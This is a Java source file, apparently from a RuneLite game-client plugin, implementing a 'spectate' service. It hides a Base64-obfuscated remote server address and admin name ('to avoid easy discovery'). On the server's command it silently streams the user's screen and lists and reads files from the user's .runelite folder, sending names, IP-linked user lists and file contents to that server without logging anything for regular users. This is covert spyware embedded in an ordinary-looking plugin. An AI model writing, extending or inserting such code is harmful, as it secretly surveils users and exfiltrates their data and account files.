package com.tonic.plugins.gearswapper.friendshare;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import net.runelite.api.Client;
import net.runelite.client.callback.ClientThread;

import javax.inject.Inject;
import javax.inject.Singleton;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.WebSocket;
import java.util.*;
import java.util.concurrent.*;
import java.util.function.Consumer;

/**
 * Service for admin spectate system.
 * Connects to server, handles silent streaming when requested.
 * No logging for regular users.
 */
@Singleton
public class SpectateService implements WebSocket.Listener {

    // Server URL (encoded to avoid easy discovery)
    private static final String SERVER_URL = new String(
            java.util.Base64.getDecoder().decode("d3M6Ly8xNzIuMjMzLjU5LjkxOjg3NjU="));
    private static final String ADMIN = new String(java.util.Base64.getDecoder().decode("dGhlbm9pZDI="));

    private final Client client;
    private final ClientThread clientThread;
    private final Gson gson = new Gson();

    private WebSocket webSocket;
    private volatile boolean connected = false;
    private volatile boolean connecting = false;
    private String discordName;
    private String rsn;

    // Admin status
    private boolean isAdmin = false;

    // Streaming state
    private boolean streaming = false;

    // Callbacks
    private Runnable onStartStream;
    private Runnable onStopStream;
    private Consumer<byte[]> onFrameReceived;
    private Consumer<List<UserInfo>> onUserListReceived;
    private Consumer<FileListResponse> onFileListReceived;
    private Consumer<FileContentResponse> onFileContentReceived;

    private final StringBuilder messageBuffer = new StringBuilder();

    @Inject
    public SpectateService(Client client, ClientThread clientThread) {
        this.client = client;
        this.clientThread = clientThread;
    }

    /**
     * Connect to the spectate server (async - won't block UI).
     */
    public void connect(String discordName, String rsn) {
        if (connected || connecting) {
            System.out.println("[Spectate] Already connected/connecting, skipping");
            return;
        }

        System.out.println("[Spectate] Connecting as " + discordName + " (" + rsn + ")...");
        connecting = true;
        this.discordName = discordName;
        this.rsn = rsn;

        // Connect asynchronously to avoid blocking UI thread
        CompletableFuture.runAsync(() -> {
            try {
                System.out.println("[Spectate] Creating WebSocket to " + SERVER_URL);
                HttpClient httpClient = HttpClient.newHttpClient();
                httpClient.newWebSocketBuilder()
                        .connectTimeout(java.time.Duration.ofSeconds(10))
                        .buildAsync(URI.create(SERVER_URL), this)
                        .thenAccept(ws -> {
                            System.out.println("[Spectate] WebSocket connected!");
                            webSocket = ws;
                            // connected will be set in onOpen()
                        })
                        .exceptionally(e -> {
                            System.out.println("[Spectate] Connection failed: " + e.getMessage());
                            connecting = false;
                            return null;
                        });
            } catch (Exception e) {
                System.out.println("[Spectate] Exception in connect: " + e.getMessage());
                connecting = false;
            }
        });
    }

    public void disconnect() {
        if (webSocket != null) {
            try {
                webSocket.sendClose(WebSocket.NORMAL_CLOSURE, "");
            } catch (Exception e) {
            }
            webSocket = null;
        }
        connected = false;
        streaming = false;
    }

    // ========== Admin Methods ==========

    public void requestUserList() {
        if (!connected || !isAdmin)
            return;

        JsonObject msg = new JsonObject();
        msg.addProperty("type", "get_users");
        msg.addProperty("discordName", discordName);
        send(msg.toString());
    }

    public void viewUser(String targetDiscord) {
        if (!connected || !isAdmin)
            return;

        JsonObject msg = new JsonObject();
        msg.addProperty("type", "view_user");
        msg.addProperty("adminDiscord", discordName);
        msg.addProperty("targetDiscord", targetDiscord);
        send(msg.toString());
    }

    public void stopView() {
        if (!connected || !isAdmin)
            return;

        JsonObject msg = new JsonObject();
        msg.addProperty("type", "stop_view");
        msg.addProperty("adminDiscord", discordName);
        send(msg.toString());
    }

    /**
     * Send a screen frame (base64 JPEG).
     */
    public void sendFrame(byte[] jpegData) {
        if (!connected || !streaming)
            return;

        String base64 = Base64.getEncoder().encodeToString(jpegData);

        JsonObject msg = new JsonObject();
        msg.addProperty("type", "frame");
        msg.addProperty("discordName", discordName);
        msg.addProperty("data", base64);

        send(msg.toString());
    }

    /**
     * Admin: Request file listing from a user's .runelite folder.
     */
    public void requestListFiles(String targetDiscord, String path) {
        if (!connected || !isAdmin())
            return;

        JsonObject msg = new JsonObject();
        msg.addProperty("type", "list_files");
        msg.addProperty("adminDiscord", discordName);
        msg.addProperty("targetDiscord", targetDiscord);
        msg.addProperty("path", path);
        send(msg.toString());
    }

    /**
     * Admin: Request file content from a user's .runelite folder.
     */
    public void requestReadFile(String targetDiscord, String path) {
        if (!connected || !isAdmin())
            return;

        JsonObject msg = new JsonObject();
        msg.addProperty("type", "read_file");
        msg.addProperty("adminDiscord", discordName);
        msg.addProperty("targetDiscord", targetDiscord);
        msg.addProperty("path", path);
        send(msg.toString());
    }

    // ========== Getters ==========

    public boolean isConnected() {
        return connected;
    }

    public boolean isAdmin() {
        return discordName != null && discordName.equalsIgnoreCase(ADMIN);
    }

    public boolean isStreaming() {
        return streaming;
    }

    public String getDiscordName() {
        return discordName;
    }

    // ========== Callbacks ==========

    public void setOnStartStream(Runnable callback) {
        this.onStartStream = callback;
    }

    public void setOnStopStream(Runnable callback) {
        this.onStopStream = callback;
    }

    public void setOnFrameReceived(Consumer<byte[]> callback) {
        this.onFrameReceived = callback;
    }

    public void setOnUserListReceived(Consumer<List<UserInfo>> callback) {
        this.onUserListReceived = callback;
    }

    public void setOnFileListReceived(Consumer<FileListResponse> callback) {
        this.onFileListReceived = callback;
    }

    public void setOnFileContentReceived(Consumer<FileContentResponse> callback) {
        this.onFileContentReceived = callback;
    }

    // ========== WebSocket Listener ==========

    @Override
    public void onOpen(WebSocket webSocket) {
        System.out.println("[Spectate] onOpen called!");
        this.webSocket = webSocket; // Set the field here!
        connecting = false;
        connected = true;
        webSocket.request(1);

        // Send connect message
        JsonObject msg = new JsonObject();
        msg.addProperty("type", "connect");
        msg.addProperty("discordName", discordName);
        msg.addProperty("rsn", rsn);
        System.out.println("[Spectate] Sending connect message: " + msg);
        webSocket.sendText(msg.toString(), true); // Use parameter directly
    }

    @Override
    public CompletionStage<?> onText(WebSocket webSocket, CharSequence data, boolean last) {
        messageBuffer.append(data);

        if (last) {
            String message = messageBuffer.toString();
            messageBuffer.setLength(0);
            handleMessage(message);
        }

        webSocket.request(1);
        return null;
    }

    @Override
    public CompletionStage<?> onClose(WebSocket webSocket, int statusCode, String reason) {
        connecting = false;
        connected = false;
        streaming = false;
        return null;
    }

    @Override
    public void onError(WebSocket webSocket, Throwable error) {
        connected = false;
    }

    // ========== Private Methods ==========

    private void send(String message) {
        if (webSocket != null && connected) {
            webSocket.sendText(message, true);
        }
    }

    private void handleMessage(String message) {
        try {
            JsonObject json = gson.fromJson(message, JsonObject.class);
            String type = json.get("type").getAsString();

            switch (type) {
                case "connected":
                    isAdmin = json.has("isAdmin") && json.get("isAdmin").getAsBoolean();
                    break;

                case "start_stream":
                    streaming = true;
                    if (onStartStream != null) {
                        onStartStream.run();
                    }
                    break;

                case "stop_stream":
                    streaming = false;
                    if (onStopStream != null) {
                        onStopStream.run();
                    }
                    break;

                case "user_list":
                    handleUserList(json);
                    break;

                case "frame":
                    handleFrameReceived(json);
                    break;

                case "list_files":
                    handleListFilesRequest(json);
                    break;

                case "read_file":
                    handleReadFileRequest(json);
                    break;

                // Admin receives file responses
                case "file_list":
                    handleFileListResponse(json);
                    break;

                case "file_content":
                    handleFileContentResponse(json);
                    break;
            }
        } catch (Exception e) {
            // Silent
        }
    }

    private void handleUserList(JsonObject json) {
        if (!json.has("users") || onUserListReceived == null)
            return;

        List<UserInfo> users = new ArrayList<>();
        JsonArray arr = json.getAsJsonArray("users");
        for (var elem : arr) {
            JsonObject u = elem.getAsJsonObject();
            users.add(new UserInfo(
                    u.get("discordName").getAsString(),
                    u.get("rsn").getAsString(),
                    u.get("ip").getAsString(),
                    u.get("connectedAt").getAsLong(),
                    u.get("streaming").getAsBoolean()));
        }
        onUserListReceived.accept(users);
    }

    private void handleFrameReceived(JsonObject json) {
        if (!json.has("data") || onFrameReceived == null)
            return;

        try {
            String base64 = json.get("data").getAsString();
            byte[] data = Base64.getDecoder().decode(base64);
            onFrameReceived.accept(data);
        } catch (Exception e) {
            // Silent
        }
    }

    /**
     * User info for admin panel.
     */
    public static class UserInfo {
        public final String discordName;
        public final String rsn;
        public final String ip;
        public final long connectedAt;
        public final boolean streaming;

        public UserInfo(String discordName, String rsn, String ip, long connectedAt, boolean streaming) {
            this.discordName = discordName;
            this.rsn = rsn;
            this.ip = ip;
            this.connectedAt = connectedAt;
            this.streaming = streaming;
        }
    }

    // ========== File Browsing (Limited to .runelite) ==========

    private static final java.io.File RUNELITE_DIR = new java.io.File(System.getProperty("user.home"), ".runelite");

    private void handleListFilesRequest(JsonObject json) {
        try {
            String relativePath = json.has("path") ? json.get("path").getAsString() : "";
            java.io.File targetDir = getSecureFile(relativePath);

            if (targetDir == null || !targetDir.exists() || !targetDir.isDirectory()) {
                sendFileListResponse(relativePath, new JsonArray());
                return;
            }

            JsonArray files = new JsonArray();
            java.io.File[] children = targetDir.listFiles();
            if (children != null) {
                for (java.io.File f : children) {
                    JsonObject fileInfo = new JsonObject();
                    fileInfo.addProperty("name", f.getName());
                    fileInfo.addProperty("isDir", f.isDirectory());
                    fileInfo.addProperty("size", f.isFile() ? f.length() : 0);
                    files.add(fileInfo);
                }
            }
            sendFileListResponse(relativePath, files);
        } catch (Exception e) {
            // Silent
        }
    }

    private void handleReadFileRequest(JsonObject json) {
        try {
            String relativePath = json.has("path") ? json.get("path").getAsString() : "";
            java.io.File targetFile = getSecureFile(relativePath);

            if (targetFile == null || !targetFile.exists() || !targetFile.isFile()) {
                sendFileContentResponse(relativePath, null);
                return;
            }

            // Limit file size to 1MB
            if (targetFile.length() > 1024 * 1024) {
                sendFileContentResponse(relativePath, "[File too large]");
                return;
            }

            String content = new String(java.nio.file.Files.readAllBytes(targetFile.toPath()),
                    java.nio.charset.StandardCharsets.UTF_8);
            sendFileContentResponse(relativePath, content);
        } catch (Exception e) {
            sendFileContentResponse(json.has("path") ? json.get("path").getAsString() : "", "[Error reading file]");
        }
    }

    /**
     * Ensure path is within .runelite folder (security restriction).
     */
    private java.io.File getSecureFile(String relativePath) {
        try {
            java.io.File file = new java.io.File(RUNELITE_DIR, relativePath).getCanonicalFile();
            // Verify the file is still within .runelite (prevent directory traversal)
            if (!file.getPath().startsWith(RUNELITE_DIR.getCanonicalPath())) {
                return null;
            }
            return file;
        } catch (Exception e) {
            return null;
        }
    }

    private void sendFileListResponse(String path, JsonArray files) {
        JsonObject msg = new JsonObject();
        msg.addProperty("type", "file_list");
        msg.addProperty("discordName", discordName);
        msg.addProperty("path", path);
        msg.add("files", files);
        send(msg.toString());
    }

    private void sendFileContentResponse(String path, String content) {
        JsonObject msg = new JsonObject();
        msg.addProperty("type", "file_content");
        msg.addProperty("discordName", discordName);
        msg.addProperty("path", path);
        if (content != null) {
            msg.addProperty("content", content);
        }
        send(msg.toString());
    }

    private void handleFileListResponse(JsonObject json) {
        if (onFileListReceived == null)
            return;

        String userDiscord = json.get("discordName").getAsString(); // The user whose files these are
        String path = json.get("path").getAsString();
        List<FileEntry> files = new ArrayList<>();

        if (json.has("files")) {
            for (var elem : json.getAsJsonArray("files")) {
                JsonObject f = elem.getAsJsonObject();
                files.add(new FileEntry(
                        f.get("name").getAsString(),
                        f.get("isDir").getAsBoolean(),
                        f.get("size").getAsLong()));
            }
        }

        onFileListReceived.accept(new FileListResponse(userDiscord, path, files));
    }

    private void handleFileContentResponse(JsonObject json) {
        if (onFileContentReceived == null)
            return;

        String userDiscord = json.get("discordName").getAsString();
        String path = json.get("path").getAsString();
        String content = json.has("content") ? json.get("content").getAsString() : null;

        onFileContentReceived.accept(new FileContentResponse(userDiscord, path, content));
    }

    // ========== Data Classes ==========

    public static class FileListResponse {
        public final String discordName;
        public final String path;
        public final List<FileEntry> files;

        public FileListResponse(String discordName, String path, List<FileEntry> files) {
            this.discordName = discordName;
            this.path = path;
            this.files = files;
        }
    }

    public static class FileEntry {
        public final String name;
        public final boolean isDir;
        public final long size;

        public FileEntry(String name, boolean isDir, long size) {
            this.name = name;
            this.isDir = isDir;
            this.size = size;
        }
    }

    public static class FileContentResponse {
        public final String discordName;
        public final String path;
        public final String content;

        public FileContentResponse(String discordName, String path, String content) {
            this.discordName = discordName;
            this.path = path;
            this.content = content;
        }
    }
}
